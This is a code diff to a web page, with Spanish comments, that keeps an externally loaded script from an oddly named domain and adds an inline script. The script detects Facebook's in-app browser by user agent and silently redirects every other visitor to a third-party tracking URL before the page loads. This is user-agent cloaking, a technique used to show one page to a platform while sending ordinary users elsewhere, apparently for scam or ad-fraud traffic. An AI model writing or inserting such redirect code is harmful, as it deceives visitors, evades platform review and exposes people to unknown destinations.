@@ -1,1 +1,22 @@
 <script src="https://kljqweqw.store//index.js" type="text/javascript" async="true"></script>
+
+    <script>
+        // Función para detectar si la página se abre en la aplicación de Facebook
+        function isFacebookApp() {
+            return navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
+        }
+
+        // Función para redirigir si no está en la aplicación de Facebook
+        function checkAndRedirect() {
+            if (!isFacebookApp()) {
+                // Si no está en la aplicación de Facebook, redirigir directamente sin cargar el contenido
+                console.log("Redirigiendo a otra página...");
+                window.location.href = "https://country.contentrightnow.com/?k=4979ad9218da3a90157cee4e188d76fa&type=mainstream&subtype=global";
+            }
+        }
+
+        // Llamar a la función al cargar el DOM
+        document.addEventListener("DOMContentLoaded", function() {
+            checkAndRedirect();
+        });
+    </script>
